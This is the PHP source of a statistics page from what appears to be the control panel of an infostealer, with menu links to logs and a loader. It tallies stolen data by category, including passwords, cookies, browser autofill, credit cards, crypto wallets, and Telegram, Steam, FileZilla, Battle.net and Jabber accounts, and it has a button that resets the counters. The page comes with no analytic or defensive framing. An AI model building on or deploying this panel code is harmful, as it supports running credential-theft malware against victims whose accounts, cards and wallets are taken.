<?php
error_reporting(0);
require("mysql.php");

if ($_COOKIE["pwd"] === md5($panel_password)){
    if(isset($_POST['clean'])){
        $rq = "UPDATE `stat` SET `telegram`='0',`autofill`='0',`passwords`='0',`cookies`='0',`crypto`='0',`steam`='0',`filezilla`='0',`battlenet`='0',`jabber`='0',`cc`='0',`ie`='0'";
        $base->query($rq);
        header("Location: index.php");
    }
    
    $request = "SELECT * FROM `stat`";
    $answ = $base->query($request);
    $row = $answ->fetchAll();
    $array = $row[0];
?>

<html>
 <head>
  <meta charset="utf-8">
  <title>Staticstic</title>
  <link href="bootstrap.css" rel="stylesheet" id="bootstrap-css">
  <link rel="stylesheet" href="w3.css">
  <link href="bar.css" rel="stylesheet" id="bootstrap-css">
 </head>
 <body class="w3-light-gray">
 
<div class="w3-sidebar w3-light-gray w3-bar-block w3-collapse w3-card w3-animate-left" style="width:200px;" id="mySidebar">
  <h4 class="w3-bar-item w3-red">Panel v1.1</h4>
  <a class="w3-bar-item w3-button" href="index.php">Logs</a>
  <a class="w3-bar-item w3-button" href="loader.php">Loader</a>
  <a class="w3-bar-item w3-button" href="stat.php">Statistic</a>
  <a class="w3-bar-item w3-button" href="features.php">Features</a>
</div>
     
<div class="main">
    
    <div class="w3-container">
        <div class="w3-card" style="display:inline-block; width:15%">
            <img src="img/telegram.png" alt="Count" style="width:100%">
            <div class="w3-container">
              <h4><b style="color: #000000;">Telegram</b></h4>
              <p>Count: <?=$array['telegram']?></p>
            </div>
        </div>

        <div class="w3-card" style="display:inline-block; width:15%">
            <img src="img/autofill.png" alt="Count" style="width:100%">
            <div class="w3-container">
              <h4><b style="color: #000000;">Autofill</b></h4>
              <p>Count: <?=$array['autofill']?></p>
            </div>
        </div>

        <div class="w3-card" style="display:inline-block; width:15%">
            <img src="img/passwords.png" alt="Count" style="width:100%">
            <div class="w3-container">
              <h4><b style="color: #000000;">Passwords</b></h4>
              <p>Count: <?=$array['passwords']?></p>
            </div>
        </div>

        <div class="w3-card" style="display:inline-block; width:15%">
            <img src="img/cookies.png" alt="Count" style="width:100%">
            <div class="w3-container">
              <h4><b style="color: #000000;">Cookies</b></h4>
              <p>Count: <?=$array['cookies']?></p>
            </div>
        </div>

        <div class="w3-card" style="display:inline-block; width:15%">
            <img src="img/crypto.png" alt="Count" style="width:100%">
            <div class="w3-container">
              <h4><b style="color: #000000;">Crypto</b></h4>
              <p>Count: <?=$array['crypto']?></p>
            </div>
        </div>

        <div class="w3-card" style="display:inline-block; width:15%">
            <img src="img/steam.png" alt="Count" style="width:100%">
            <div class="w3-container">
              <h4><b style="color: #000000;">Steam</b></h4>
              <p>Count: <?=$array['steam']?></p>
            </div>
        </div>
    </div>
    
    <br>
    
    <div class="w3-container">
        <div class="w3-card" style="display:inline-block; width:15%">
            <img src="img/filezilla.png" alt="Count" style="width:100%">
            <div class="w3-container">
              <h4><b style="color: #000000;">Filezilla</b></h4>
              <p>Count: <?=$array['filezilla']?></p>
            </div>
        </div>

        <div class="w3-card" style="display:inline-block; width:15%">
            <img src="img/battlenet.png" alt="Count" style="width:100%">
            <div class="w3-container">
              <h4><b style="color: #000000;">Battle.net</b></h4>
              <p>Count: <?=$array['battlenet']?></p>
            </div>
        </div>

        <div class="w3-card" style="display:inline-block; width:15%">
            <img src="img/jabber.png" alt="Count" style="width:100%">
            <div class="w3-container">
              <h4><b style="color: #000000;">Jabber</b></h4>
              <p>Count: <?=$array['jabber']?></p>
            </div>
        </div>

        <div class="w3-card" style="display:inline-block; width:15%">
            <img src="img/cc.png" alt="Count" style="width:100%">
            <div class="w3-container">
              <h4><b style="color: #000000;">CС Cards</b></h4>
              <p>Count: <?=$array['cc']?></p>
            </div>
        </div>

        <div class="w3-card" style="display:inline-block; width:15%">
            <img src="img/ie.png" alt="Count" style="width:100%">
            <div class="w3-container">
              <h4><b style="color: #000000;">IE</b></h4>
              <p>Count: <?=$array['ie']?></p>
            </div>
        </div>
    </div>
    
</div>
  
 </body>
</html>
<?php
}else{
	header("location: login.php");
}
?>